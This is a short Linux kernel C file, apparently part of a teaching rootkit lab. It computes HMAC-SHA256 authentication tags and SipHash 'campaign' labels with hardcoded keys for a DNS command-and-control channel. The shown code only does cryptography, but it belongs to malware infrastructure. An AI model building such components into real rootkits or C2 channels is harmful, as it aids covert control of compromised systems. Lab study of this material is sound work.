// SPDX-License-Identifier: GPL-2.0
#include "dns_c2.h"
#include <crypto/hash.h>
#include <crypto/sha2.h>
#include <linux/siphash.h>

static const u8 auth_key[] = "rootkitlings-dns-lab";
static const siphash_key_t campaign_key = {
	.key = { 0x6b69746b6f6f7274ULL, 0x73676e696c746f6fULL },
};

int auth_tag(const char *signal, char output[AUTH_TAG_HEX_SIZE])
{
	struct crypto_shash *transform;
	u8 digest[SHA256_DIGEST_SIZE];
	int error;
	int index;

	transform = crypto_alloc_shash("hmac(sha256)", 0, 0);
	if (IS_ERR(transform))
		return PTR_ERR(transform);
	error = crypto_shash_setkey(transform, auth_key, sizeof(auth_key) - 1);
	if (!error)
		error = crypto_shash_tfm_digest(transform, signal,
						strlen(signal), digest);
	crypto_free_shash(transform);
	if (!error) {
		for (index = 0; index < AUTH_TAG_BYTES; index++)
			snprintf(output + index * 2, 3, "%02x", digest[index]);
	}
	memzero_explicit(digest, sizeof(digest));
	return error;
}

void campaign_label(u64 bucket, char output[CAMPAIGN_LABEL_SIZE])
{
	u64 label = siphash_1u64(bucket, &campaign_key);

	snprintf(output, CAMPAIGN_LABEL_SIZE, "%016llx",
		 (unsigned long long)label);
}
